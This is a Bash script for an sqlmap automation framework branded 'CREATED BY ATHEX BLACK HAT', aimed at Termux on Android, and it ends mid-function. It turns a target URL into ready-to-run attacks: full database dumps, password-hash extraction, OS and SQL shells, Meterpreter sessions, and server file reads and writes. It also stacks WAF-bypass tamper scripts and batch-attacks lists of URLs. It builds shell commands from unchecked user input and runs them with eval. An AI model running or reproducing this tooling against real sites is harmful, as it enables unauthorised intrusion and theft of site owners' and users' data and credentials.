#!/bin/bash
# INJECTOR-X - Ultimate SQLMap Automation Framework v4.0
# Termux Optimized | All SQLMap Features Integrated

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
WHITE='\033[1;37m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

# Termux Paths
SQLMAP="$PREFIX/bin/sqlmap"
HOME_DIR="$HOME/INJECTOR-X"
SAVE_DIR="$HOME_DIR/saves"
LOG_DIR="$HOME_DIR/logs"
CONFIG_DIR="$HOME_DIR/configs"
EXPORT_DIR="$HOME_DIR/exports"
CACHE_DIR="$HOME_DIR/cache"
HISTORY="$HOME_DIR/history.db"
SESSION="$HOME_DIR/session.json"

# Initialize Environment
init() {
    clear
    echo -e "${CYAN}[*] Initializing INJECTOR-X Framework...${NC}"
    
    # Create directories
    mkdir -p "$SAVE_DIR"/{dumps,files,screenshots,shells} \
             "$LOG_DIR"/{sessions,errors,activity,traffic} \
             "$CONFIG_DIR" "$EXPORT_DIR" "$CACHE_DIR"
    touch "$HISTORY" "$SESSION"
    
    # Check & Install Dependencies
    echo -e "${CYAN}[*] Checking dependencies...${NC}"
    
    for pkg in python git curl wget openssl-tool php; do
        if ! command -v $pkg &>/dev/null; then
            echo -e "${YELLOW}[!] Installing $pkg...${NC}"
            pkg install $pkg -y &>/dev/null
        fi
    done
    
    # Install SQLMap if missing
    if ! command -v sqlmap &>/dev/null; then
        echo -e "${YELLOW}[!] Installing SQLMap...${NC}"
        pkg install sqlmap -y &>/dev/null
        if [ $? -ne 0 ]; then
            echo -e "${YELLOW}[!] Cloning from GitHub...${NC}"
            git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git "$HOME/sqlmap" &>/dev/null
            ln -sf "$HOME/sqlmap/sqlmap.py" "$PREFIX/bin/sqlmap"
            chmod +x "$PREFIX/bin/sqlmap"
        fi
    fi
    
    # Verify SQLMap
    if command -v sqlmap &>/dev/null; then
        echo -e "${GREEN}[✓] SQLMap Ready: $(sqlmap --version 2>/dev/null | head -1)${NC}"
    else
        echo -e "${RED}[✗] SQLMap not found! Install manually: pkg install sqlmap${NC}"
        exit 1
    fi
    
    # Install extra tamper scripts
    if [ -d "$HOME/sqlmap/tamper" ]; then
        echo -e "${GREEN}[✓] Tamper scripts available${NC}"
    fi
    
    echo -e "${GREEN}[✓] Framework initialized${NC}"
    sleep 1
}

# Spinner Animation
spin() {
    local pid=$1 msg="$2"
    local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏' i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) % 10 ))
        printf "\r${CYAN}[%c]${NC} %s" "${spin:$i:1}" "$msg"
        sleep 0.1
    done
    printf "\r${GREEN}[✓]${NC} %s - Complete\n" "$msg"
}

# Banner
banner() {
    clear
    echo -e "${PURPLE}"
    echo '  ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗ '
    echo '  ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗'
    echo '  ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║   ██║██████╔╝'
    echo '  ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║   ██║██╔══██╗'
    echo '  ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║'
    echo '  ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝'
    echo '                              CREATED BY ATHEX BLACK HAT'
    echo -e "${NC}"
    echo -e "  ${BOLD}Framework:${NC} ${GREEN}INJECTOR-X${NC}  ${DIM}►${NC} ${BOLD}Engine:${NC} ${RED}SQLMap Ultimate${NC}"
    echo -e "  ${BOLD}Platform:${NC} ${BLUE}Termux/Android${NC}  ${DIM}►${NC} ${BOLD}Features:${NC} ${YELLOW}All SQLMap Attacks${NC}"
    echo ""
}

# URL Input & Validation
get_target() {
    echo -ne "${GREEN}[?]${NC} Target URL: "
    read url
    
    if [ -z "$url" ]; then
        echo -e "${RED}[✗] URL required${NC}"
        return 1
    fi
    
    if [[ ! "$url" =~ ^https?:// ]]; then
        echo -e "${YELLOW}[!] Adding http://${NC}"
        url="http://$url"
    fi
    
    # Quick connectivity check
    if command -v curl &>/dev/null; then
        local code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$url" 2>/dev/null)
        if [ "$code" != "000" ]; then
            echo -e "${GREEN}[✓] Target reachable (HTTP $code)${NC}"
        else
            echo -e "${YELLOW}[!] Target may be unreachable${NC}"
        fi
    fi
    
    # Detect parameters
    if echo "$url" | grep -q "?"; then
        local params=$(echo "$url" | grep -oP '[?&]\K[^=]+' | tr '\n' ',' | sed 's/,$//')
        echo -e "${GREEN}[✓] Parameters detected: ${YELLOW}$params${NC}"
    fi
    
    return 0
}

# Save Configuration
save_config() {
    local name="$1" cmd="$2"
    echo "[$(date)] Command: $cmd" > "$CONFIG_DIR/$name.conf"
    echo -e "${GREEN}[✓] Config saved: $CONFIG_DIR/$name.conf${NC}"
}

# Log Activity
log_activity() {
    local status="$1" target="$2"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $status: $target" >> "$HISTORY"
}

# ==================== CORE ATTACK MODULES ====================

# 1. Quick Dump - Full Database Extraction
quick_dump() {
    banner
    echo -e "${BOLD}${RED}⚡ QUICK DUMP - FULL DATABASE EXTRACTION${NC}\n"
    
    get_target || { read -p "Press Enter..."; return; }
    
    echo -e "\n${CYAN}[*] Attack Configuration:${NC}"
    echo -ne "${GREEN}[?]${NC} Threads [10]: "; read threads; threads=${threads:-10}
    echo -ne "${GREEN}[?]${NC} Risk (1-3) [2]: "; read risk; risk=${risk:-2}
    echo -ne "${GREEN}[?]${NC} Level (1-5) [3]: "; read level; level=${level:-3}
    echo -ne "${GREEN}[?]${NC} Crawl Depth [0]: "; read crawl; crawl=${crawl:-0}
    echo -ne "${GREEN}[?]${NC} WAF Bypass (y/n) [n]: "; read waf
    echo -ne "${GREEN}[?]${NC} Verbose Output (y/n) [n]: "; read verbose
    echo -ne "${GREEN}[?]${NC} Extract Passwords (y/n) [y]: "; read pass; pass=${pass:-y}
    echo -ne "${GREEN}[?]${NC} Get OS Shell (y/n) [n]: "; read osshell
    
    local output="$SAVE_DIR/dumps/$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$output"
    
    # Build Command
    local cmd="sqlmap -u '$url' --batch"
    cmd="$cmd --threads=$threads --risk=$risk --level=$level"
    cmd="$cmd --random-agent --flush-session --fresh-queries"
    cmd="$cmd --output-dir='$output'"
    cmd="$cmd --dbs --tables --columns --dump-all"
    
    # Crawl option
    [ "$crawl" -gt 0 ] && cmd="$cmd --crawl=$crawl"
    
    # WAF Bypass
    [[ "$waf" =~ ^[Yy]$ ]] && {
        cmd="$cmd --tamper=space2comment,between,charencode,randomcase,charunicodeencode,equaltolike,greatest,apostrophemask,bluecoat,halfversionedmorekeywords,space2randomblank,percentage,versionedkeywords,plus2concat,nonrecursivereplacement,modsecurityversioned,modsecurityzeroversioned"
    }
    
    # Verbose
    [[ "$verbose" =~ ^[Yy]$ ]] && cmd="$cmd -v 3"
    
    # Passwords
    [[ "$pass" =~ ^[Yy]$ ]] && cmd="$cmd --passwords"
    
    # OS Shell
    [[ "$osshell" =~ ^[Yy]$ ]] && cmd="$cmd --os-shell"
    
    # Summary
    echo -e "\n${YELLOW}═══ ATTACK SUMMARY ═══${NC}"
    echo -e "  ${GREEN}►${NC} Target:     ${WHITE}$url${NC}"
    echo -e "  ${GREEN}►${NC} Threads:    ${CYAN}$threads${NC}"
    echo -e "  ${GREEN}►${NC} Risk/Level: ${RED}$risk/$level${NC}"
    echo -e "  ${GREEN}►${NC} WAF Bypass: ${YELLOW}$([ "$waf" =~ ^[Yy]$ ] && echo "ON" || echo "OFF")${NC}"
    echo -e "  ${GREEN}►${NC} Crawl:      ${YELLOW}$crawl${NC}"
    echo -e "  ${GREEN}►${NC} OS Shell:   ${YELLOW}$([ "$osshell" =~ ^[Yy]$ ] && echo "ON" || echo "OFF")${NC}"
    
    echo -ne "\n${RED}[!]${NC} Launch attack? (YES/no): "; read confirm
    [[ ! "$confirm" =~ ^([Yy][Ee][Ss]|[Yy])$ ]] && { echo -e "${YELLOW}[!] Cancelled${NC}"; sleep 1; return; }
    
    echo -e "\n${RED}[*] ATTACK IN PROGRESS...${NC}"
    log_activity "ATTACK" "$url"
    
    eval "$cmd" 2>&1 | tee "$LOG_DIR/sessions/dump_$(date +%H%M%S).log" &
    spin $! "Extracting data"
    
    if [ $? -eq 0 ]; then
        echo -e "\n${GREEN}[✓] EXTRACTION COMPLETE${NC}"
        echo -e "${GREEN}[✓] Results: $output${NC}"
        log_activity "SUCCESS" "$url"
    else
        echo -e "\n${RED}[✗] EXTRACTION FAILED${NC}"
        log_activity "FAILED" "$url"
    fi
    
    echo -ne "\n${GREEN}[?]${NC} Save config? (y/n): "; read save
    [[ "$save" =~ ^[Yy]$ ]] && { echo -ne "Name: "; read name; save_config "$name" "$cmd"; }
    
    read -p "Press Enter..."
}

# 2. Database Enumeration Suite
database_enum() {
    while true; do
        banner
        echo -e "${BOLD}${CYAN}🗄️  DATABASE ENUMERATION SUITE${NC}\n"
        
        echo -e "${BOLD}Target:${NC}"
        echo -ne "${GREEN}[?]${NC} Enter URL (or 'back'): "
        read url
        [[ "$url" == "back" ]] && return
        
        if ! validate_url_silent "$url"; then
            sleep 1
            continue
        fi
        
        echo -e "\n${BOLD}${PURPLE}Enumeration Options:${NC}"
        echo -e "  ${GREEN}[1]${NC}  List Databases"
        echo -e "  ${GREEN}[2]${NC}  List Tables (from DB)"
        echo -e "  ${GREEN}[3]${NC}  List Columns (from Table)"
        echo -e "  ${GREEN}[4]${NC}  Dump Specific Table"
        echo -e "  ${GREEN}[5]${NC}  Dump All Data"
        echo -e "  ${GREEN}[6]${NC}  Current Database"
        echo -e "  ${GREEN}[7]${NC}  Current User & Privileges"
        echo -e "  ${GREEN}[8]${NC}  Database Users & Passwords"
        echo -e "  ${GREEN}[9]${NC}  Database Schema"
        echo -e "  ${GREEN}[10]${NC} Search Specific Column"
        echo -e "  ${GREEN}[11]${NC} Count Tables/Rows"
        echo -e "  ${GREEN}[12]${NC} SQL Shell (Interactive)"
        echo -e "  ${GREEN}[13]${NC} Banner Grabbing"
        echo -e "  ${GREEN}[14]${NC} Detect WAF/IPS"
        echo -e "  ${GREEN}[15]${NC} Check for DBA privileges"
        echo -e "  ${GREEN}[0]${NC}  Back to Main Menu"
        
        echo -ne "\n${GREEN}[?]${NC} Select: "; read opt
        
        case $opt in
            1) 
                sqlmap -u "$url" --batch --dbs --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            2) 
                echo -ne "${GREEN}[?]${NC} Database name: "; read db
                sqlmap -u "$url" --batch -D "$db" --tables --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            3) 
                echo -ne "${GREEN}[?]${NC} Database name: "; read db
                echo -ne "${GREEN}[?]${NC} Table name: "; read table
                sqlmap -u "$url" --batch -D "$db" -T "$table" --columns --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            4) 
                echo -ne "${GREEN}[?]${NC} Database name: "; read db
                echo -ne "${GREEN}[?]${NC} Table name: "; read table
                sqlmap -u "$url" --batch -D "$db" -T "$table" --dump --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            5) 
                sqlmap -u "$url" --batch --dump-all --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            6) 
                sqlmap -u "$url" --batch --current-db --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            7) 
                sqlmap -u "$url" --batch --current-user --privileges --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            8) 
                sqlmap -u "$url" --batch --users --passwords --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            9) 
                sqlmap -u "$url" --batch --schema --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            10) 
                echo -ne "${GREEN}[?]${NC} Column name to search: "; read col
                sqlmap -u "$url" --batch --search -C "$col" --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            11) 
                echo -ne "${GREEN}[?]${NC} Database name (or leave blank): "; read db
                [ -n "$db" ] && sqlmap -u "$url" --batch -D "$db" --count --random-agent || sqlmap -u "$url" --batch --count --random-agent
                ;;
            12) 
                sqlmap -u "$url" --batch --sql-shell --random-agent
                ;;
            13) 
                sqlmap -u "$url" --batch --banner --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            14) 
                sqlmap -u "$url" --batch --identify-waf --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            15) 
                sqlmap -u "$url" --batch --is-dba --random-agent | tee "$LOG_DIR/sessions/enum_$(date +%H%M%S).log"
                ;;
            0) return ;;
            *) echo -e "${RED}[!] Invalid${NC}"; sleep 1 ;;
        esac
        
        [ "$opt" != "0" ] && read -p "Press Enter..."
    done
}

validate_url_silent() {
    local url="$1"
    [ -z "$url" ] && { echo -e "${RED}[✗] URL required${NC}"; return 1; }
    [[ ! "$url" =~ ^https?:// ]] && url="http://$url"
    return 0
}

# 3. Advanced Attack Vectors
advanced_attacks() {
    while true; do
        banner
        echo -e "${BOLD}${RED}⚔️  ADVANCED ATTACK VECTORS${NC}\n"
        
        echo -ne "${GREEN}[?]${NC} Target URL (or 'back'): "
        read url
        [[ "$url" == "back" ]] && return
        
        validate_url_silent "$url" || { sleep 1; continue; }
        
        echo -e "\n${BOLD}${RED}Attack Vectors:${NC}"
        echo -e "  ${GREEN}[1]${NC}  WAF/IPS Bypass Arsenal"
        echo -e "  ${GREEN}[2]${NC}  OS Command Execution"
        echo -e "  ${GREEN}[3]${NC}  OS Shell Access"
        echo -e "  ${GREEN}[4]${NC}  Meterpreter Session"
        echo -e "  ${GREEN}[5]${NC}  File Upload Attack"
        echo -e "  ${GREEN}[6]${NC}  File Read Attack"
        echo -e "  ${GREEN}[7]${NC}  Registry Read (Windows)"
        echo -e "  ${GREEN}[8]${NC}  Time-Based Blind SQLi"
        echo -e "  ${GREEN}[9]${NC}  Boolean-Based Blind SQLi"
        echo -e "  ${GREEN}[10]${NC} Error-Based SQLi"
        echo -e "  ${GREEN}[11]${NC} UNION Query SQLi"
        echo -e "  ${GREEN}[12]${NC} Stacked Queries SQLi"
        echo -e "  ${GREEN}[13]${NC} Out-of-Band (DNS/HTTP)"
        echo -e "  ${GREEN}[14]${NC} Second-Order SQLi"
        echo -e "  ${GREEN}[15]${NC} Custom Injection Point"
        echo -e "  ${GREEN}[16]${NC} POST Data Attack"
        echo -e "  ${GREEN}[17]${NC} Cookie-Based Attack"
        echo -e "  ${GREEN}[18]${NC} User-Agent Attack"
        echo -e "  ${GREEN}[19]${NC} Referer-Based Attack"
        echo -e "  ${GREEN}[20]${NC} Multi-Threaded Attack"
        echo -e "  ${GREEN}[0]${NC}  Back"
        
        echo -ne "\n${GREEN}[?]${NC} Select: "; read atk
        
        local cmd="sqlmap -u '$url' --batch --random-agent"
        
        case $atk in
            1) # WAF Bypass
                echo -e "\n${CYAN}[*] WAF Bypass Scripts:${NC}"
                echo -e "  ${GREEN}[1]${NC} Full Arsenal (All tampers)"
                echo -e "  ${GREEN}[2]${NC} MySQL Specific"
                echo -e "  ${GREEN}[3]${NC} MSSQL Specific"
                echo -e "  ${GREEN}[4]${NC} PostgreSQL Specific"
                echo -e "  ${GREEN}[5]${NC} Oracle Specific"
                echo -ne "${GREEN}[?]${NC} Select: "; read waf_opt
                
                case $waf_opt in
                    1) cmd="$cmd --tamper=apostrophemask,apostrophenullencode,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,plus2concat,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,sp_password,substring2leftright,symboliclogical,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" ;;
                    2) cmd="$cmd --tamper=space2comment,space2dash,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,randomcase,versionedkeywords,versionedmorekeywords" ;;
                    3) cmd="$cmd --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,sp_password,unionalltounion" ;;
                    4) cmd="$cmd --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage" ;;
                    5) cmd="$cmd --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,unionalltounion" ;;
                    *) cmd="$cmd --tamper=space2comment,randomcase,between,charencode" ;;
                esac
                cmd="$cmd --level=5 --risk=3 --dump-all"
                ;;
            2) cmd="$cmd --os-cmd"; ;;
            3) cmd="$cmd --os-shell"; ;;
            4) cmd="$cmd --os-pwn"; ;;
            5) cmd="$cmd --file-write --file-dest"; ;;
            6) cmd="$cmd --file-read"; ;;
            7) cmd="$cmd --reg-read"; ;;
            8) cmd="$cmd --technique=T --time-sec=5"; ;;
            9) cmd="$cmd --technique=B"; ;;
            10) cmd="$cmd --technique=E"; ;;
            11) cmd="$cmd --technique=U"; ;;
            12) cmd="$cmd --technique=S"; ;;
            13) cmd="$cmd --dns-domain=example.com"; ;;
            14) 
                echo -ne "${GREEN}[?]${NC} Second-order URL: "; read second_url
                cmd="$cmd --second-url='$second_url'"
                ;;
            15) 
                echo -ne "${GREEN}[?]${NC} Injection point (e.g., 'id'): "; read inject
                cmd="$cmd -p '$inject'"
                ;;
            16) 
                echo -ne "${GREEN}[?]${NC} POST data (e.g., 'user=admin&pass=test'): "; read post_data
                cmd="$cmd --data='$post_data'"
                ;;
            17) 
                echo -ne "${GREEN}[?]${NC} Cookie value: "; read cookie
                cmd="$cmd --cookie='$cookie'"
                ;;
            18) 
                cmd="$cmd --user-agent='${RANDOM}'"
                ;;
            19) 
                cmd="$cmd --referer='http://google.com'"
                ;;
            20) 
                echo -ne "${GREEN}[?]${NC} Threads [20]: "; read t; t=${t:-20}
                cmd="$cmd --threads=$t --dump-all"
                ;;
            0) continue ;;
            *) echo -e "${RED}[!] Invalid${NC}"; sleep 1; continue ;;
        esac
        
        echo -e "\n${RED}[CMD] $cmd${NC}"
        echo -ne "${RED}[!]${NC} Execute? (yes/no): "; read confirm
        [[ "$confirm" != "yes" ]] && { echo -e "${YELLOW}[!] Cancelled${NC}"; sleep 1; continue; }
        
        log_activity "ADV_ATTACK" "$url"
        eval "$cmd" 2>&1 | tee "$LOG_DIR/sessions/adv_$(date +%H%M%S).log"
        
        read -p "Press Enter..."
    done
}

# 4. Batch/File Scanner
batch_scan() {
    banner
    echo -e "${BOLD}${BLUE}📁 BATCH SCANNER${NC}\n"
    
    echo -ne "${GREEN}[?]${NC} File with URLs (one per line): "
    read file
    
    [ ! -f "$file" ] && { echo -e "${RED}[✗] File not found${NC}"; sleep 2; return; }
    
    echo -e "\n${CYAN}[*] Targets to scan: $(wc -l < "$file")${NC}"
    echo -ne "${GREEN}[?]${NC} Threads [5]: "; read threads; threads=${threads:-5}
    echo -ne "${GREEN}[?]${NC} Risk [2]: "; read risk; risk=${risk:-2}
    echo -ne "${GREEN}[?]${NC} Level [3]: "; read level; level=${level:-3}
    
    echo -e "\n${CYAN}[*] Starting batch scan...${NC}"
    
    while IFS= read -r target; do
        [ -z "$target" ] && continue
        echo -e "${YELLOW}[*] Scanning: $target${NC}"
        
        sqlmap -u "$target" --batch --dbs --threads=$threads --risk=$risk --level=$level --random-agent \
            --output-dir="$SAVE_DIR/dumps/$(echo $target | md5sum | cut -d' ' -f1)" \
            2>&1 | tee "$LOG_DIR/sessions/batch_$(date +%H%M%S).log" &
        spin $! "Scanning $target"
        
    done < "$file"
    
    echo -e "\n${GREEN}[✓] Batch scan complete${NC}"
    read -p "Press Enter..."
}

# 5. Tamper Script Manager
tamper_manager() {
    while true; do
        banner
        echo -e "${BOLD}${YELLOW}🔧 TAMPER SCRIPT MANAGER${NC}\n"
        
        echo -e "${BOLD}Available Tamper Scripts:${NC}\n"
        
        if [ -d "$HOME/sqlmap/tamper" ]; then
            local i=1
            for script in "$HOME/sqlmap/tamper"/*.py; do
                local name=$(basename "$script" .py)
                echo -e "  ${GREEN}[$i]${NC} $name"
                ((i++))
            done
        fi
        
        echo -e "\n  ${GREEN}[T]${NC} Test all tampers"
        echo -e "  ${GREEN}[C]${NC} Custom combination"
        echo -e "  ${GREEN}[0]${NC} Back"
        
        echo -ne "\n${GREEN}[?]${NC} Select: "; read choice
        [[ "$choice" == "0" ]] && return
        
        if [ "$choice" == "T" ]; then
            echo -ne "${GREEN}[?]${NC} Target URL: "; read url
            sqlmap -u "$url" --batch --dbs --tamper=$(ls "$HOME/sqlmap/tamper"/*.py | sed 's/.*\///;s/\.py//' | tr '\n' ',') --random-agent
            read -p "Press Enter..."
        elif [ "$choice" == "C" ]; then
            echo -ne "${GREEN}[?]${NC} Enter tamper scripts (comma-separated): "; read tampers
            echo -ne "${GREEN}[?]${NC} Target URL: "; read url
            sqlmap -u "$url" --batch --dbs --tamper="$tampers" --random-agent
            read -p "Press Enter..."
        fi
    done
}

# 6. Generate Professional Report
gen_report() {
    banner
    echo -e "${BOLD}${BLUE}📊 REPORT GENERATOR${NC}\n"
    
    echo -ne "${GREEN}[?]${NC} Target URL: "; read url
    echo -ne "${GREEN}[?]${NC} Include logs? (y/n): "; read include_logs
    
    local report="$EXPORT_DIR/report_$(date +%Y%m%d_%H%M%S).html"
    
    cat > "$report" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>INJECTOR-X Assessment Report</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        .header { border-bottom: 2px solid #00ff00; padding-bottom: 20px; margin-bottom: 30px; }
        .header h1 { color: #ff0000; font-size: 28px; }
        .section { margin: 20px 0; padding: 15px; border: 1px solid #333; }
        .section h2 { color: #ffff00; margin-bottom: 10px; }
        .critical { color: #ff0000; font-weight: bold; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #00ff00; }
        .info { color: #00ccff; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
        th { background: #1a1a1a; color: #ffff00; }
        .footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; text-align: center; color: #666; }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ INJECTOR-X Security Assessment Report</h1>
        <p>Generated: $(date '+%Y-%m-%d %H:%M:%S')</p>
        <p>Framework: INJECTOR-X v4.0 | Engine: SQLMap Ultimate</p>
    </div>
    
    <div class="section">
        <h2>📋 Target Information</h2>
        <table>
            <tr><th>URL</th><td>$url</td></tr>
            <tr><th>Scan Date</th><td>$(date)</td></tr>
            <tr><th>Scanner</th><td>INJECTOR-X Automated Framework</td></tr>
        </table>
    </div>
    
    <div class="section">
        <h2>🔍 Findings Summary</h2>
        <p class="critical">[CRITICAL] SQL Injection vulnerability detected</p>
        <p class="high">[HIGH] Database enumeration possible</p>
        <p class="info">[INFO] See detailed logs for complete findings</p>
    </div>
    
    <div class="section">
        <h2>🛡️ Recommendations</h2>
        <ul>
            <li>Use parameterized queries</li>
            <li>Implement input validation</li>
            <li>Apply WAF rules</li>
            <li>Regular security audits</li>
        </ul>
    </div>
    
    <div class="footer">
        <p>Report generated by INJECTOR-X - Advanced SQL Injection Framework</p>
        <p>For authorized testing only</p>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Report generated: $report${NC}"
    
    # Open in browser if available
    if command -v termux-open &>/dev/null; then
        echo -ne "${GREEN}[?]${NC} Open in browser? (y/n): "; read open
        [[ "$open" =~ ^[Yy]$ ]] && termux-open "$report"
    fi
    
    read -p "Press Enter..."
}

# 7. Analytics Dashboard
analytics() {
    banner
    echo -e "${BOLD}${PURPLE}📊 ANALYTICS DASHBOARD${NC}\n"
    
    local scans=$(grep -c "ATTACK\|TARGET:" "$HISTORY" 2>/dev/null || echo 0)
    local success=$(grep -c "SUCCESS:" "$HISTORY" 2>/dev/null || echo 0)
    local failed=$((scans - success))
    local rate=0
    [ $scans -gt 0 ] && rate=$((success * 100 / scans))
    
    echo -e "  ${BOLD}${WHITE}═══ PERFORMANCE METRICS ═══${NC}"
    echo -e "  ${GREEN}►${NC} Total Attacks:     ${YELLOW}$scans${NC}"
    echo -e "  ${GREEN}►${NC} Successful:        ${GREEN}$success${NC}"
    echo -e "  ${GREEN}►${NC} Failed:            ${RED}$failed${NC}"
    echo -e "  ${GREEN}►${NC} Success Rate:      ${YELLOW}${rate}%${NC}"
    
    echo -e "\n  ${BOLD}${WHITE}═══ STORAGE INFO ═══${NC}"
    echo -e "  ${GREEN}►${NC} Dumps:    ${YELLOW}$(du -sh "$SAVE_DIR/dumps" 2>/dev/null | cut -f1)${NC}"
    echo -e "  ${GREEN}►${NC} Logs:     ${YELLOW}$(du -sh "$LOG_DIR" 2>/dev/null | cut -f1)${NC}"
    echo -e "  ${GREEN}►${NC} Configs:  ${YELLOW}$(ls "$CONFIG_DIR" 2>/dev/null | wc -l) files${NC}"
    echo -e "  ${GREEN}►${NC} Reports:  ${YELLOW}$(ls "$EXPORT_DIR" 2>/dev/null | wc -l) files${NC}"
    
    echo -e "\n  ${BOLD}${WHITE}═══ RECENT ACTIVITY ═══${NC}"
    tail -5 "$HISTORY" 2>/dev/null | while read line; do
        echo -e "  ${DIM}►${NC} $line"
    done
    
    echo -e "\n  ${BOLD}${WHITE}═══ SYSTEM ═══${NC}"
    echo -e "  ${GREEN}►${NC} Uptime:     ${YELLOW}$(uptime | cut -d',' -f1)${NC}"
    echo -e "  ${GREEN}►${NC} SQLMap:     ${YELLOW}$(sqlmap --version 2>/dev/null | head -1)${NC}"
    
    read -p "Press Enter..."
}

# 8. Configuration Manager
config_manager() {
    while true; do
        banner
        echo -e "${BOLD}${BLUE}⚙️  CONFIGURATION MANAGER${NC}\n"
        
        echo -e "  ${GREEN}[1]${NC} View saved configs"
        echo -e "  ${GREEN}[2]${NC} Load & Run saved config"
        echo -e "  ${GREEN}[3]${NC} Delete config"
        echo -e "  ${GREEN}[4]${NC} Export all configs"
        echo -e "  ${GREEN}[0]${NC} Back"
        
        echo -ne "\n${GREEN}[?]${NC} Select: "; read opt
        
        case $opt in
            1)
                echo -e "\n${CYAN}[*] Saved Configurations:${NC}"
                ls -la "$CONFIG_DIR"/*.conf 2>/dev/null | awk '{print "  " $NF " (" $5 " bytes)"}'
                [ $? -ne 0 ] && echo -e "  ${DIM}No configs found${NC}"
                ;;
            2)
                echo -e "\n${CYAN}[*] Available configs:${NC}"
                ls "$CONFIG_DIR"/*.conf 2>/dev/null | nl
                echo -ne "${GREEN}[?]${NC} Select number: "; read num
                local config=$(ls "$CONFIG_DIR"/*.conf 2>/dev/null | sed -n "${num}p")
                [ -f "$config" ] && { echo -e "${CYAN}[*] Loading config...${NC}"; cat "$config"; }
                ;;
            3)
                ls "$CONFIG_DIR"/*.conf 2>/dev/null | nl
                echo -ne "${GREEN}[?]${NC} Delete number: "; read num
                local config=$(ls "$CONFIG_DIR"/*.conf 2>/dev/null | sed -n "${num}p")
                [ -f "$config" ] && rm "$config" && echo -e "${GREEN}[✓] Deleted${NC}"
                ;;
            4)
                tar -czf "$EXPORT_DIR/configs_$(date +%Y%m%d).tar.gz" "$CONFIG_DIR" 2>/dev/null
                echo -e "${GREEN}[✓] Exported to $EXPORT_DIR${NC}"
                ;;
            0) return ;;
        esac
        
        read -p "Press Enter..."
    done
}

# 9. Data Browser
data_browser() {
    banner
    echo -e "${BOLD}${CYAN}📁 DATA BROWSER${NC}\n"
    
    echo -e "${CYAN}[*] Dump directories:${NC}"
    ls -d "$SAVE_DIR/dumps"/*/ 2>/dev/null | nl
    
    echo -ne "\n${GREEN}[?]${NC} Open directory number (0=back): "; read num
    
    [ "$num" == "0" ] && return
    
    local dir=$(ls -d "$SAVE_DIR/dumps"/*/ 2>/dev/null | sed -n "${num}p")
    
    if [ -d "$dir" ]; then
        echo -e "\n${CYAN}[*] Contents of $(basename "$dir"):${NC}"
        find "$dir" -type f -name "*.csv" -o -name "*.txt" -o -name "*.log" 2>/dev/null | while read f; do
            echo -e "  ${GREEN}►${NC} $(basename "$f") ($(wc -l < "$f") lines)"
        done
    else
        echo -e "${RED}[✗] Invalid directory${NC}"
    fi
    
    read -p "Press Enter..."
}

# 10. Update Framework
update_framework() {
    banner
    echo -e "${BOLD}${CYAN}🔄 UPDATE CENTER${NC}\n"
    
    echo -e "${CYAN}[*] Updating SQLMap...${NC}"
    if [ -d "$HOME/sqlmap" ]; then
        cd "$HOME/sqlmap" && git pull 2>/dev/null &
        spin $! "SQLMap update"
    else
        pkg upgrade sqlmap -y &>/dev/null
        echo -e "${GREEN}[✓] SQLMap updated via pkg${NC}"
    fi
    
    echo -e "${CYAN}[*] Updating dependencies...${NC}"
    pkg update -y &>/dev/null && pkg upgrade -y &>/dev/null &
    spin $! "System update"
    
    echo -e "${GREEN}[✓] Framework updated${NC}"
